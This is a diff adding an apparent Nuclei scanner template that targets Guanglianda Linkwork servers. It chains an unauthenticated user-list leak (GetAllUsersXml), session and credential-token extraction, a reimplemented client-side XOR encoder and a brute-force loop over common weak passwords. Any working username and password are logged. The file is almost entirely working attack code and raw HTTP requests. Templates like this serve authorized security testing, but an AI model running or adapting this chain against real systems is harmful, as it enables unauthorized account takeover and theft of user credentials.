@@ -1,0 +1,170 @@
+id: guanglianda-linkwork-infoleak-with-password
+
+info:
+  name: guanglianda-linkwork-infoleak-with-password
+  author: msk
+  severity: high
+
+
+flow: |
+
+  function TJsEncrypt(str) {
+    var o = new Date().getMilliseconds();
+    var a = Math.round(Math.random() * 14) + 1;
+    var s = o + '#|,|#' + str;
+    var len = s.length;
+    var buf = '';
+    for (var i = 0; i < len; i++) {
+        var x = (s.charCodeAt(i) ^ a).toString(16);
+        if (x.length == 1)
+            x = '000' + x;
+        else if (x.length == 2)
+            x = '00' + x;
+        else if (x.length == 3)
+            x = '0' + x;
+        buf += x;
+    }
+    return a.toString(16) + buf;
+  }
+
+  if (http(1)==false){
+    
+  }else{
+    var hdn_sessionID = template["hdn_sessionID"]
+
+    
+    
+    if(http(2)===true){
+        
+        for (var i = 0; i < template["infoleak"].length; i++){
+          var sucess = 0
+          username = template["infoleak"][i].split('"')[1]
+          var passwordlist = ["123456","password","111111","123123","11111111","12345678"]; 
+          for (let password of iterate(passwordlist)) {
+            if(http(3)===true){
+              loginCredence = template["loginCredence"][0].split('"')[1]
+              login_data = '<request command="4" provider="GTP_Identify_Provider_Password" tag="web" sessionID="%s" loginCredence="%s"> <inputData step="1"><inputs><input id="username" value="%s" /><input id="password" value="%s"/></inputs></inputData><networkDevices></networkDevices></request>'
+              login_data = login_data.replace("%s", hdn_sessionID).replace("%s", loginCredence).replace("%s", username).replace("%s",password)
+              set("clientRequest",TJsEncrypt(login_data))
+              set("username",username)
+              set("password",password)
+              if (http(4)===true){
+                log(username+" "+password)
+                var sucess = 1
+                break
+              }
+            }
+          }
+          if (sucess === 1){
+            break //注释掉 一个网站爆破成功也继续爆破，保留就是一个网站爆破出来一个就停止
+          }
+        }
+    }   
+  }
+  
+
+
+
+http:
+  - raw:
+      - |
+        GET /Services/Identification/Server/login.ashx?service=/Services/Identification/login.ashx&logout=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"hdn_provider",'hdn_currentStepIndex','hdn_sessionID')
+
+    extractors:
+      - type: xpath
+        name: hdn_sessionID
+        internal: true
+        xpath:
+          - "//input[@id='hdn_sessionID']/@value"
+
+
+  - raw:
+      - |
+        GET /Org/service/Service.asmx/GetAllUsersXml HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: infoleak
+        internal: true
+        regex:
+          - 'Code="(.*?)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"<string",'xmlns=','Users')
+
+
+  - raw:
+      - |
+        POST /Services/Identification/Server/httpRequest.ashx?cmd=70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+
+    extractors:
+      - type: regex
+        name: loginCredence
+        internal: true
+        regex:
+          - 'loginCredence="(.*?)"'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"loginCredence")
+
+
+  - raw:
+      - |
+        POST /Services/Identification/Server/PostLogin.ashx? HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+        clientRequest={{clientRequest}}
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username
+          - password
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'\"Finished\":true,')
